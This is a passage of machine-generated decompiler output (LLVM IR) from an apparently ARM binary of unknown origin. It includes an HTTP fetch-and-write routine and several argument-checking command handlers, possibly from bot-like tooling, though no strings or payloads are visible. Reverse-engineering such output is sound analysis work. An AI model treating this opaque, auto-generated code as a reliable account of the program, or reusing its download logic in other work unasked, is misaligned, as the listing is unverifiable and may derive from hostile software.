  store i32 %v2_8f80, i32* %r1.global-to-local, align 4
  %v2_8f94 = inttoptr i32 %v2_8f80 to i8*
  %v3_8f94 = call i32 @function_f090(i32 %v2_8f88, i8* %v2_8f94)
  br label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f38, %dec_label_pc_8f6c
  %v2_8fb8.pre-phi = phi i32 [ %v2_8f58, %dec_label_pc_8f38 ], [ %v2_8f88, %dec_label_pc_8f6c ]
  br label %dec_label_pc_8fb0

dec_label_pc_8fa4:                                ; preds = %dec_label_pc_8fd0
  %v1_8fa8 = add i32 %storemerge5, 1
  br label %dec_label_pc_8fb0

dec_label_pc_8fb0:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_8fa4
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8f98 ], [ %v1_8fa8, %dec_label_pc_8fa4 ]
  store i32 %storemerge5, i32* @r4, align 4
  store i32 %v2_8fb8.pre-phi, i32* @r0, align 4
  %v0_8fc0 = call i32 @function_f030()
  %v0_8fc8 = load i32, i32* @r4, align 4
  %v3_8fc8 = icmp ult i32 %v0_8fc8, %v0_8fc0
  br i1 %v3_8fc8, label %dec_label_pc_8fd0, label %dec_label_pc_8ff4

dec_label_pc_8fd0:                                ; preds = %dec_label_pc_8fb0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_8fe0 = add i32 %storemerge5, %v16_8df8
  %v2_8fe4 = add i32 %v2_8fe0, -1084
  %v1_8fe8 = inttoptr i32 %v2_8fe4 to i8*
  %v2_8fe8 = load i8, i8* %v1_8fe8, align 1
  %v7_8fec = icmp eq i8 %v2_8fe8, 47
  br i1 %v7_8fec, label %dec_label_pc_8ff4, label %dec_label_pc_8fa4

dec_label_pc_8ff4:                                ; preds = %dec_label_pc_8fb0, %dec_label_pc_8fd0
  %v2_9004 = add i32 %v16_8df8, -1084
  %v2_9008 = add i32 %v2_9004, %storemerge5
  %v3_9010 = inttoptr i32 %v2_9008 to i8*
  store i8 0, i8* %v3_9010, align 1
  store i32 2, i32* %stack_var_-80, align 4
  %v1_9028 = call i32 @function_f604(i32 80)
  store i32 %v2_8fb8.pre-phi, i32* @r0, align 4
  %v1_9048 = call i32 @function_f730(i32 %v2_8fb8.pre-phi)
  %v3_9058 = icmp eq i32 %v1_9048, -1
  br i1 %v3_9058, label %dec_label_pc_9060, label %dec_label_pc_90e0

dec_label_pc_9060:                                ; preds = %dec_label_pc_8ff4
  %v1_906c = call i32 @function_f754(i32 %v2_8fb8.pre-phi)
  %v2_907c = icmp eq i32 %v1_906c, 0
  br i1 %v2_907c, label %dec_label_pc_9084, label %dec_label_pc_90b4

dec_label_pc_9084:                                ; preds = %dec_label_pc_9060
  store i32 %v16_8df8, i32* @lr, align 4
  %v4_9098 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_150e4.51 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_90a8 = call i32 @function_8374(i32 %v4_9098, i32 ptrtoint ([39 x i8]* @global_var_150e4.51 to i32))
  %v1_90b0 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_90b4

dec_label_pc_90b4:                                ; preds = %dec_label_pc_9060, %dec_label_pc_9084
  %v2_90b8 = ptrtoint i32* %stack_var_-76 to i32
  %v1_90c0 = add i32 %v1_906c, 16
  %v2_90c0 = inttoptr i32 %v1_90c0 to i32*
  %v3_90c0 = load i32, i32* %v2_90c0, align 4
  %v1_90c4 = inttoptr i32 %v3_90c0 to i32*
  %v2_90c4 = load i32, i32* %v1_90c4, align 4
  store i32 %v2_90c4, i32* @r1, align 4
  %v1_90cc = add i32 %v1_906c, 12
  %v2_90cc = inttoptr i32 %v1_90cc to i32*
  %v3_90cc = load i32, i32* %v2_90cc, align 4
  store i32 %v2_90b8, i32* @r0, align 4
  store i32 %v3_90cc, i32* @r2, align 4
  %v0_90d8 = call i32 @function_ef60()
  br label %dec_label_pc_90e8

dec_label_pc_90e0:                                ; preds = %dec_label_pc_8ff4
  store i32 %v1_9048, i32* %stack_var_-76, align 4
  br label %dec_label_pc_90e8

dec_label_pc_90e8:                                ; preds = %dec_label_pc_90b4, %dec_label_pc_90e0
  %v2_90e8.pre-phi = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_90e8.pre-phi, i32* %r1.global-to-local, align 4
  %v3_9110 = bitcast i32* %stack_var_-80 to %sockaddr*
  %v4_9110 = call i32 @function_fb64(i32 %v3_8ebc, %sockaddr* %v3_9110, i32 16)
  %v2_9118 = icmp eq i32 %v4_9110, 0
  br i1 %v2_9118, label %dec_label_pc_9150, label %dec_label_pc_9120

dec_label_pc_9120:                                ; preds = %dec_label_pc_90e8
  %v4_9134 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_1510c.53 to i32), i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9144 = call i32 @function_8374(i32 %v4_9134, i32 ptrtoint ([39 x i8]* @global_var_1510c.53 to i32))
  %v1_914c = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_90e8, %dec_label_pc_9120
  %v2_9160 = add i32 %v2_8fb8.pre-phi, 1
  %v1_9164 = add i32 %v2_9160, %storemerge5
  store i32 %v1_9164, i32* @r2, align 4
  store i32 ptrtoint ([276 x i8]* @global_var_15134.55 to i32), i32* %r1.global-to-local, align 4
  %v3_9178 = call i32 @function_8374(i32 %v3_8ebc, i32 ptrtoint ([276 x i8]* @global_var_15134.55 to i32))
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_9190 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([28 x i8]* @global_var_15248.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_91a0 = call i32 @function_8374(i32 %v4_9190, i32 ptrtoint ([28 x i8]* @global_var_15248.57 to i32))
  %v4_91b0 = load i32, i32* %stack_var_-5216, align 4
  %v1_91b4 = add i32 %v4_91b0, 8
  %v1_91b8 = inttoptr i32 %v1_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15264.59 to i32), i32* @r1, align 4
  %v3_91c4 = call i32 @function_d050(i32 %v2_91b8, i32 ptrtoint ([3 x i8]* @global_var_15264.59 to i32))
  %v2_91d8 = ptrtoint i32* %stack_var_-5200 to i32
  %v2_9228 = add i32 %v16_8df8, -5180
  br label %dec_label_pc_91d0

dec_label_pc_91d0:                                ; preds = %dec_label_pc_9364, %dec_label_pc_9150
  store i32 %v2_91d8, i32* %r1.global-to-local, align 4
  %v5_91ec = call i32 @function_fbbc(i32 %v3_8ebc, i32* nonnull %stack_var_-5200, i32 4096, i32 0)
  %tmp56 = icmp slt i32 %v5_91ec, 1
  br i1 %tmp56, label %dec_label_pc_9384.loopexit9, label %dec_label_pc_9204

dec_label_pc_9204:                                ; preds = %dec_label_pc_91d0
  %v8_9214 = icmp sgt i32 %v5_91ec, 4095
  br i1 %v8_9214, label %dec_label_pc_9244.lr.ph, label %dec_label_pc_9218

dec_label_pc_9218:                                ; preds = %dec_label_pc_9204
  %v2_922c = add i32 %v5_91ec, %v2_9228
  %v3_9234 = inttoptr i32 %v2_922c to i8*
  store i8 0, i8* %v3_9234, align 1
  br label %dec_label_pc_9244.lr.ph

dec_label_pc_9244.lr.ph:                          ; preds = %dec_label_pc_9218, %dec_label_pc_9204
  br label %dec_label_pc_9244

dec_label_pc_9244:                                ; preds = %dec_label_pc_9244.lr.ph, %dec_label_pc_9364
  %storemerge691 = phi i32 [ 0, %dec_label_pc_9244.lr.ph ], [ %v1_9368, %dec_label_pc_9364 ]
  %v2_9258 = add i32 %storemerge691, %v2_91d8
  store i32 ptrtoint ([5 x i8]* @global_var_15268.61 to i32), i32* @r1, align 4
  %v4_9268 = inttoptr i32 %v2_9258 to i8*
  %v5_9268 = call i32 @function_f0ac(i8* %v4_9268, i32 ptrtoint ([5 x i8]* @global_var_15268.61 to i32), i32 4)
  %v2_9270 = icmp eq i32 %v5_9268, 0
  br i1 %v2_9270, label %dec_label_pc_9278, label %dec_label_pc_9364

dec_label_pc_9278:                                ; preds = %dec_label_pc_9244
  %v1_927c = add i32 %storemerge691, 4
  %v1_9294 = add i32 %v3_91c4, 52
  %v2_9294 = inttoptr i32 %v1_9294 to i32*
  %v1_92a4 = add i32 %v3_91c4, 16
  %v2_92a4 = inttoptr i32 %v1_92a4 to i32*
  %v1_92ac = add i32 %v3_91c4, 28
  %v2_92ac = inttoptr i32 %v1_92ac to i32*
  %v5_935c80 = icmp slt i32 %v1_927c, %v5_91ec
  br i1 %v5_935c80, label %dec_label_pc_9288, label %dec_label_pc_9384

dec_label_pc_9288:                                ; preds = %dec_label_pc_9278, %dec_label_pc_9344
  %storemerge781 = phi i32 [ %v1_9348, %dec_label_pc_9344 ], [ %v1_927c, %dec_label_pc_9278 ]
  %v3_9294 = load i32, i32* %v2_9294, align 4
  %v2_9298 = icmp eq i32 %v3_9294, 0
  br i1 %v2_9298, label %dec_label_pc_931c, label %dec_label_pc_92a0

dec_label_pc_92a0:                                ; preds = %dec_label_pc_9288
  %v3_92a4 = load i32, i32* %v2_92a4, align 4
  %v3_92ac = load i32, i32* %v2_92ac, align 4
  %v3_92b0 = icmp ult i32 %v3_92a4, %v3_92ac
  br i1 %v3_92b0, label %dec_label_pc_92b8, label %dec_label_pc_92f0

dec_label_pc_92b8:                                ; preds = %dec_label_pc_92a0
  %v3_92bc = load i32, i32* %v2_92a4, align 4
  store i32 %v3_92bc, i32* %r1.global-to-local, align 4
  %v2_92d0 = add i32 %storemerge781, %v16_8df8
  %v2_92d4 = add i32 %v2_92d0, -5180
  %v1_92d8 = inttoptr i32 %v2_92d4 to i8*
  %v2_92d8 = load i8, i8* %v1_92d8, align 1
  %v3_92dc = inttoptr i32 %v3_92bc to i8*
  store i8 %v2_92d8, i8* %v3_92dc, align 1
  %v0_92e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_92e0 = add i32 %v0_92e0, 1
  store i32 %v1_92e0, i32* %v2_92a4, align 4
  br label %dec_label_pc_9344

dec_label_pc_92f0:                                ; preds = %dec_label_pc_92a0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_9300 = add i32 %storemerge781, %v16_8df8
  %v2_9304 = add i32 %v2_9300, -5180
  %v1_9308 = inttoptr i32 %v2_9304 to i8*
  %v2_9308 = load i8, i8* %v1_9308, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_9314 = call i32 @function_ed64(i8 %v2_9308, i32 %v3_91c4, i32 %v2_9300)
  br label %dec_label_pc_9344

dec_label_pc_931c:                                ; preds = %dec_label_pc_9288
  %v2_932c = add i32 %storemerge781, %v16_8df8
  %v2_9330 = add i32 %v2_932c, -5180
  %v1_9334 = inttoptr i32 %v2_9330 to i8*
  %v2_9334 = load i8, i8* %v1_9334, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_9340 = call i32 @function_e850(i8 %v2_9334, i32 %v3_91c4, i32 %v2_932c)
  br label %dec_label_pc_9344

dec_label_pc_9344:                                ; preds = %dec_label_pc_92f0, %dec_label_pc_92b8, %dec_label_pc_931c
  %v1_9348 = add i32 %storemerge781, 1
  %v5_935c = icmp slt i32 %v1_9348, %v5_91ec
  br i1 %v5_935c, label %dec_label_pc_9288, label %dec_label_pc_9384

dec_label_pc_9364:                                ; preds = %dec_label_pc_9244
  %v1_9368 = add nuw nsw i32 %storemerge691, 1
  %v5_937c = icmp slt i32 %v1_9368, %v5_91ec
  br i1 %v5_937c, label %dec_label_pc_9244, label %dec_label_pc_91d0

dec_label_pc_9384.loopexit9:                      ; preds = %dec_label_pc_91d0
  %.pre17 = add i32 %v3_91c4, 52
  %.pre18 = inttoptr i32 %.pre17 to i32*
  %.pre19 = add i32 %v3_91c4, 16
  %.pre20 = inttoptr i32 %.pre19 to i32*
  %.pre21 = add i32 %v3_91c4, 28
  %.pre22 = inttoptr i32 %.pre21 to i32*
  br label %dec_label_pc_9384

dec_label_pc_9384:                                ; preds = %dec_label_pc_9278, %dec_label_pc_9344, %dec_label_pc_9384.loopexit9
  %v2_9460.pre-phi = phi i32* [ %.pre22, %dec_label_pc_9384.loopexit9 ], [ %v2_92ac, %dec_label_pc_9344 ], [ %v2_92ac, %dec_label_pc_9278 ]
  %v2_9458.pre-phi = phi i32* [ %.pre20, %dec_label_pc_9384.loopexit9 ], [ %v2_92a4, %dec_label_pc_9344 ], [ %v2_92a4, %dec_label_pc_9278 ]
  %v2_9448.pre-phi = phi i32* [ %.pre18, %dec_label_pc_9384.loopexit9 ], [ %v2_9294, %dec_label_pc_9344 ], [ %v2_9294, %dec_label_pc_9278 ]
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_93b0 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_15270.63 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_93c4 = call i32 @function_8374(i32 %v4_93b0, i32 ptrtoint ([24 x i8]* @global_var_15270.63 to i32))
  br label %dec_label_pc_93c8

dec_label_pc_93c8:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_9384
  store i32 %v2_91d8, i32* %r1.global-to-local, align 4
  %v5_93e4 = call i32 @function_fbbc(i32 %v3_8ebc, i32* nonnull %stack_var_-5200, i32 4096, i32 0)
  %tmp58 = icmp slt i32 %v5_93e4, 1
  br i1 %tmp58, label %dec_label_pc_9518, label %dec_label_pc_93fc

dec_label_pc_93fc:                                ; preds = %dec_label_pc_93c8
  %v8_940c = icmp sgt i32 %v5_93e4, 4095
  br i1 %v8_940c, label %dec_label_pc_943c.lr.ph, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_93fc
  %v2_9424 = add i32 %v5_93e4, %v2_9228
  %v3_942c = inttoptr i32 %v2_9424 to i8*
  store i8 0, i8* %v3_942c, align 1
  br label %dec_label_pc_943c.lr.ph

dec_label_pc_943c.lr.ph:                          ; preds = %dec_label_pc_9410, %dec_label_pc_93fc
  br label %dec_label_pc_943c

dec_label_pc_943c:                                ; preds = %dec_label_pc_943c.lr.ph, %dec_label_pc_94f8
  %storemerge871 = phi i32 [ 0, %dec_label_pc_943c.lr.ph ], [ %v1_94fc, %dec_label_pc_94f8 ]
  %v3_9448 = load i32, i32* %v2_9448.pre-phi, align 4
  %v2_944c = icmp eq i32 %v3_9448, 0
  br i1 %v2_944c, label %dec_label_pc_94d0, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_943c
  %v3_9458 = load i32, i32* %v2_9458.pre-phi, align 4
  %v3_9460 = load i32, i32* %v2_9460.pre-phi, align 4
  %v3_9464 = icmp ult i32 %v3_9458, %v3_9460
  br i1 %v3_9464, label %dec_label_pc_946c, label %dec_label_pc_94a4

dec_label_pc_946c:                                ; preds = %dec_label_pc_9454
  %v3_9470 = load i32, i32* %v2_9458.pre-phi, align 4
  store i32 %v3_9470, i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  %v2_9484 = add i32 %storemerge871, %v16_8df8
  %v2_9488 = add i32 %v2_9484, -5180
  %v1_948c = inttoptr i32 %v2_9488 to i8*
  %v2_948c = load i8, i8* %v1_948c, align 1
  %v3_9490 = inttoptr i32 %v3_9470 to i8*
  store i8 %v2_948c, i8* %v3_9490, align 1
  %v0_9494 = load i32, i32* %r1.global-to-local, align 4
  %v1_9494 = add i32 %v0_9494, 1
  store i32 %v1_9494, i32* %v2_9458.pre-phi, align 4
  br label %dec_label_pc_94f8

dec_label_pc_94a4:                                ; preds = %dec_label_pc_9454
  %v2_94b4 = add i32 %storemerge871, %v16_8df8
  %v2_94b8 = add i32 %v2_94b4, -5180
  %v1_94bc = inttoptr i32 %v2_94b8 to i8*
  %v2_94bc = load i8, i8* %v1_94bc, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_94c8 = call i32 @function_ed64(i8 %v2_94bc, i32 %v3_91c4, i32 %v2_94b4)
  br label %dec_label_pc_94f8

dec_label_pc_94d0:                                ; preds = %dec_label_pc_943c
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_94e0 = add i32 %storemerge871, %v16_8df8
  %v2_94e4 = add i32 %v2_94e0, -5180
  %v1_94e8 = inttoptr i32 %v2_94e4 to i8*
  %v2_94e8 = load i8, i8* %v1_94e8, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_94f4 = call i32 @function_e850(i8 %v2_94e8, i32 %v3_91c4, i32 %v2_94e0)
  br label %dec_label_pc_94f8

dec_label_pc_94f8:                                ; preds = %dec_label_pc_94a4, %dec_label_pc_946c, %dec_label_pc_94d0
  %v1_94fc = add nuw nsw i32 %storemerge871, 1
  %v5_9510 = icmp slt i32 %v1_94fc, %v5_93e4
  br i1 %v5_9510, label %dec_label_pc_943c, label %dec_label_pc_93c8

dec_label_pc_9518:                                ; preds = %dec_label_pc_93c8
  %v1_951c = inttoptr i32 %v3_91c4 to i8*
  %v2_951c = call i32 @function_ced0(i8* %v1_951c)
  %v1_9524 = call i32 @function_cbe4(i32 %v3_8ebc)
  %v1_952c = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_9530

dec_label_pc_9530:                                ; preds = %dec_label_pc_8df4, %dec_label_pc_9518
  %v12_9534 = phi i32 [ %v1_8e58, %dec_label_pc_8df4 ], [ %v1_952c, %dec_label_pc_9518 ]
  ret i32 %v12_9534

; uselistorder directives
  uselistorder i32 %storemerge871, { 0, 3, 2, 1 }
  uselistorder i32 %v5_93e4, { 1, 0, 2, 3 }
  uselistorder i32* %v2_9458.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v1_9348, { 1, 0 }
  uselistorder i32 %storemerge781, { 0, 3, 2, 1 }
  uselistorder i32 %storemerge691, { 1, 0, 2 }
  uselistorder i32 %v5_91ec, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_91d8, { 1, 0, 2 }
  uselistorder i32 %v3_91c4, { 14, 13, 12, 11, 10, 0, 1, 2, 8, 7, 4, 3, 6, 5, 9 }
  uselistorder i32 %storemerge5, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_8fb8.pre-phi, { 0, 4, 2, 3, 1 }
  uselistorder i32* %v4_8e14, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %v16_8df8, { 0, 14, 1, 2, 13, 15, 16, 3, 4, 12, 5, 7, 17, 11, 18, 8, 6, 10, 19, 20, 9, 21, 22, 23 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i32 -5180, { 4, 5, 6, 1, 2, 3, 0 }
  uselistorder i32 -1084, { 0, 2, 3, 4, 1 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_9530, { 1, 0 }
  uselistorder label %dec_label_pc_94f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_943c, { 1, 0 }
  uselistorder label %dec_label_pc_9384, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9344, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9288, { 1, 0 }
  uselistorder label %dec_label_pc_9244, { 1, 0 }
  uselistorder label %dec_label_pc_9150, { 1, 0 }
  uselistorder label %dec_label_pc_90e8, { 1, 0 }
  uselistorder label %dec_label_pc_90b4, { 1, 0 }
  uselistorder label %dec_label_pc_8ff4, { 1, 0 }
  uselistorder label %dec_label_pc_8fb0, { 1, 0 }
  uselistorder label %dec_label_pc_8f98, { 1, 0 }
  uselistorder label %dec_label_pc_8f04, { 1, 0 }
  uselistorder label %dec_label_pc_8eb0, { 1, 0 }
}

define i32 @function_9560(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9560:
  %tmp25 = call i8 @__decompiler_undefined_function_2()
  %tmp26 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  store i32 38252, i32* %stack_var_-4, align 4
  %v2_9568 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9568, i32* @fp, align 4
  %v2_9590 = load i32, i32* @global_var_1847c.35, align 4
  %v7_95b0 = icmp eq i32 %v2_9590, 1
  br i1 %v7_95b0, label %dec_label_pc_95b8, label %dec_label_pc_9614

dec_label_pc_95b8:                                ; preds = %dec_label_pc_9560
  store i32 %arg2, i32* @r2, align 4
  %v3_960c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_15288.67 to i32))
  br label %dec_label_pc_96b8

dec_label_pc_9614:                                ; preds = %dec_label_pc_9560
  %v2_9584 = load i8*, i8** @global_var_18478.33, align 4
  %v3_9584 = ptrtoint i8* %v2_9584 to i32
  store i32 %v3_9584, i32* @lr, align 4
  %v3_9658 = sext i8 %tmp26 to i32
  store i32 %v3_9658, i32* @r4, align 4
  %v3_9668 = sext i8 %tmp25 to i32
  store i32 %v3_9668, i32* @r5, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_96b4 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_152a8.69 to i32))
  br label %dec_label_pc_96b8

dec_label_pc_96b8:                                ; preds = %dec_label_pc_95b8, %dec_label_pc_9614
  %storemerge = phi i32 [ %v3_96b4, %dec_label_pc_9614 ], [ %v3_960c, %dec_label_pc_95b8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
}

define i32 @function_96d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_96d0:
  %stack_var_-4 = alloca i32, align 4
  store i32 38620, i32* %stack_var_-4, align 4
  %v2_96d8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_96d8, i32* @fp, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_96fc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_152d8.71 to i32))
  ret i32 %v3_96fc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_970c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_970c:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 38680, i32* %stack_var_-4, align 4
  %v2_9714 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9714, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v7_9730 = icmp eq i32 %arg3, 1
  br i1 %v7_9730, label %dec_label_pc_974c, label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_970c
  store i32 %arg2, i32* @r2, align 4
  %v3_9744 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_152f8.73 to i32))
  br label %dec_label_pc_979c

dec_label_pc_974c:                                ; preds = %dec_label_pc_970c
  %v1_9750 = add i32 %arg4, 4
  %v1_9754 = inttoptr i32 %v1_9750 to i32*
  %v2_9754 = load i32, i32* %v1_9754, align 4
  store i32 %v2_9754, i32* @r0, align 4
  %v0_975c = call i32 @function_f030()
  %tmp = icmp ult i32 %v0_975c, 10
  br i1 %tmp, label %dec_label_pc_9780, label %dec_label_pc_976c

dec_label_pc_976c:                                ; preds = %dec_label_pc_974c
  store i32 %arg2, i32* @r2, align 4
  %v3_9778 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_15310.75 to i32))
  br label %dec_label_pc_979c

dec_label_pc_9780:                                ; preds = %dec_label_pc_974c
  %v3_9780 = load i32, i32* %stack_var_-32, align 4
  %v1_9784 = add i32 %v3_9780, 4
  %v1_9788 = inttoptr i32 %v1_9784 to i32*
  %v2_9788 = load i32, i32* %v1_9788, align 4
  store i32 %v2_9788, i32* @r2, align 4
  %v3_9798 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_15348.77 to i32))
  br label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %dec_label_pc_976c, %dec_label_pc_9738, %dec_label_pc_9780
  %v9_97a0 = phi i32 [ %v3_9778, %dec_label_pc_976c ], [ %v3_9744, %dec_label_pc_9738 ], [ %v3_9798, %dec_label_pc_9780 ]
  ret i32 %v9_97a0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_979c, { 2, 0, 1 }
}

define i32 @function_97b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_97b0:
  %stack_var_-4 = alloca i32, align 4
  store i32 38844, i32* %stack_var_-4, align 4
  %v2_97b8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_97b8, i32* @fp, align 4
  %v7_97d4 = icmp eq i32 %arg3, 1
  br i1 %v7_97d4, label %dec_label_pc_9828, label %dec_label_pc_97dc

dec_label_pc_97dc:                                ; preds = %dec_label_pc_97b0
  store i32 %arg2, i32* @r2, align 4
  %v3_97e8 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_15354.79 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9820 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_15398.86 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_9828:                                ; preds = %dec_label_pc_97b0
  %v2_982c = load i8, i8* bitcast (i8** @global_var_18474.23 to i8*), align 4
  %v2_9830 = icmp eq i8 %v2_982c, 0
  br i1 %v2_9830, label %dec_label_pc_984c, label %dec_label_pc_9838

dec_label_pc_9838:                                ; preds = %dec_label_pc_9828
  store i32 %arg2, i32* @r2, align 4
  %v3_9844 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_153bc.88 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_984c:                                ; preds = %dec_label_pc_9828
  %v1_9850 = add i32 %arg4, 4
  %v1_9854 = inttoptr i32 %v1_9850 to i32*
  %v2_9854 = load i32, i32* %v1_9854, align 4
  store i32 %v2_9854, i32* @r0, align 4
  %v0_985c = call i32 @function_f030()
  %tmp = icmp ult i32 %v0_985c, 255
  br i1 %tmp, label %dec_label_pc_9880, label %dec_label_pc_986c

dec_label_pc_986c:                                ; preds = %dec_label_pc_984c
  store i32 %arg2, i32* @r2, align 4
  %v3_9878 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_153dc.90 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_9880:                                ; preds = %dec_label_pc_984c
  store i8 1, i8* bitcast (i8** @global_var_18474.23 to i8*), align 4
  store i32 256, i32* @r2, align 4
  %v3_989c = call i32 @function_ef70(i8* bitcast (i32* @global_var_1aaf0.92 to i8*), i32 0)
  %v2_98a8 = load i32, i32* %v1_9854, align 4
  %v2_98b4 = inttoptr i32 %v2_98a8 to i8*
  %v3_98b4 = call i32 @function_f090(i32 ptrtoint (i32* @global_var_1aaf0.92 to i32), i8* %v2_98b4)
  %v3_98c0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_15404.94 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_98c4:                                ; preds = %dec_label_pc_986c, %dec_label_pc_9838, %dec_label_pc_97dc, %dec_label_pc_9880
  %v9_98c8 = phi i32 [ %v3_9878, %dec_label_pc_986c ], [ %v3_9844, %dec_label_pc_9838 ], [ %v3_9820, %dec_label_pc_97dc ], [ %v3_98c0, %dec_label_pc_9880 ]
  ret i32 %v9_98c8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_98c4, { 3, 0, 1, 2 }
}

define i32 @function_98f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_98f0:
  %stack_var_-4 = alloca i32, align 4
  store i32 39164, i32* %stack_var_-4, align 4
  %v2_98f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_98f8, i32* @fp, align 4
  %v7_9914 = icmp eq i32 %arg3, 1
  br i1 %v7_9914, label %dec_label_pc_9968, label %dec_label_pc_991c

dec_label_pc_991c:                                ; preds = %dec_label_pc_98f0
  store i32 %arg2, i32* @r2, align 4
  %v3_9928 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_15424.96 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9960 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_15398.86 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_9968:                                ; preds = %dec_label_pc_98f0
  %v2_996c = load i8, i8* bitcast (i8** @global_var_18474.23 to i8*), align 4
